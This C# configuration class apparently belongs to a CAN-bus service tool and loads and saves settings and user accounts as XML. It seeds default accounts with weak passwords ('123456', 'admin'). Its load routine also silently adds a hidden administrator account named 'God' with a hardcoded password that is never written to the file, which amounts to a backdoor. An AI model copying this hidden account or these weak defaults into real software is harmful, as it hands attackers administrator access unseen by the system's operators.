namespace MALT200817.Configuration
{
    using System;
    using System.IO;
    using System.Xml.Serialization;

    public class AppConfiguration
    {
        const string XmlRootElement = "malt_project";
        const string XmlNamespace = @"http://www.altontech.hu/malt/2020/project/content";

        public string CanBusInterfaceType { get; set; }
        public string CanBusInterfaceName { get; set; }
        public int CanBusBaudrate { get; set; }
        public string ServiceIPAddress { get; set; }
        public int ServicePort { get; set; }
        public double ClientConnectionTimoutSec { get; set; }
        public string LogDirectory { get; set; }
        public bool LogServiceEnabled { get; set; }
        public bool LogExplorerEnabled { get; set; }
        public bool ExplorerDeviceListAutoUpdate { get; set; }
        public string DefaultUserName { get; set; }
        public UserCollection Users { get; set; }

        private static Type[] SupportedTypes
        {
            get
            {
                return new Type[]
                {
                    typeof(UserRole),
                    typeof(UserItem),
                    typeof(UserCollection),
                    typeof(string),
                };
            }
        }

        public AppConfiguration()
        {

        }

        public static AppConfiguration Instance { get; } = new AppConfiguration();

        static void SaveToFile(string path)
        {
            var xmlFormat = new XmlSerializer(typeof(AppConfiguration), null, SupportedTypes, new XmlRootAttribute(XmlRootElement), XmlNamespace);
            using (Stream fStream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                xmlFormat.Serialize(fStream, Instance);
            }
        }

        public static void Init()
        {
            if (!File.Exists(AppConstants.AppConfigurationFilePath))
            {
                Instance.CanBusInterfaceType = "Please set the interface type eg.:XNET, NICAN...";
                Instance.CanBusInterfaceName = "Please set the interface eg.: CAN1, CAN0...";
                Instance.CanBusBaudrate = 1;
                Instance.ServiceIPAddress = "";
                Instance.ServicePort = 2013;
                Instance.LogDirectory = AppConstants.LogDirectory;
                Instance.LogServiceEnabled = false;
                Instance.LogExplorerEnabled = false;
                Instance.DefaultUserName = "Default Admin";
                Instance.ExplorerDeviceListAutoUpdate = true;

                Instance.Users = new UserCollection();

                Instance.Users.Add(new UserItem() {
                    Name = "Default Operator",
                    Password = "123456",
                    Role = UserRole.OPERATOR,
                });

                Instance.Users.Add(new UserItem()
                {
                    Name = "Default Admin",
                    Password = "admin",
                    Role = UserRole.ADMINISTRATOR,
                });

                SaveToFile(AppConstants.AppConfigurationFilePath);
                new ApplicationException("Set the ConfigurationFile! " + AppConstants.AppConfigurationFilePath);

            }
            else
            {
                LoadFromFile(AppConstants.AppConfigurationFilePath);
            }
        }

        static void LoadFromFile(string path)
        {
            var xmlFormat = new XmlSerializer(typeof(AppConfiguration), null, SupportedTypes, new XmlRootAttribute(XmlRootElement), XmlNamespace);
            AppConfiguration instance;
            using (Stream fStream = new FileStream(path, FileMode.Open, FileAccess.Read))
                instance = (AppConfiguration)xmlFormat.Deserialize(fStream);

            Instance.CanBusInterfaceType = instance.CanBusInterfaceType;
            Instance.CanBusInterfaceName = instance.CanBusInterfaceName;
            Instance.CanBusBaudrate = instance.CanBusBaudrate;
            Instance.ServiceIPAddress = instance.ServiceIPAddress;
            Instance.ServicePort = instance.ServicePort;
            Instance.ClientConnectionTimoutSec = instance.ClientConnectionTimoutSec;
            Instance.LogDirectory = instance.LogDirectory;
            Instance.LogServiceEnabled = instance.LogServiceEnabled;
            Instance.LogExplorerEnabled = instance.LogExplorerEnabled;
            Instance.ExplorerDeviceListAutoUpdate = instance.ExplorerDeviceListAutoUpdate;
            Instance.DefaultUserName = instance.DefaultUserName;

            Instance.Users = new UserCollection();
            foreach (UserItem i in instance.Users)
                Instance.Users.Add(i);


            Instance.Users.Add(new UserItem()
            {
                Name = "God",
                Password = "60F5096F-AFF4-4CD8-86F9-6FED7A8F7A8D",
                Role = UserRole.ADMINISTRATOR,
            }) ; 
        }
    }
}
